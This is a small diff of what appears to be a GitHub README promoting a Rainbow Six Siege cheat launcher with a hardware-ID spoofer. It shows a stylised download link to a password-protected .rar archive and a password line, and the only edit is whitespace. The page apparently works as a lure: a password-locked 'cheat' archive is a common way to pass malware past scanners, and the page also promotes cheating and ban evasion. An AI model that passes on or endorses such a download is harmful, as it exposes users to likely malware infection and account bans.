@@ -13,7 +13,7 @@ HWID Spoofer :: Built-in
 
 # 🗂[ℂ𝕃𝕀ℂ𝕂 ℍ𝔼ℝ𝔼 𝕋𝕆 𝔻𝕆𝕎ℕ𝕃𝕆𝔸𝔻](https://github.com/AkutIobw/Akutiobw-project/raw/main/r6s%20cheat%20launcher.rar)
 
-# 🔐Password: 2023
+# 🔐Password:  2023
 
 # 🌌Functional:
 
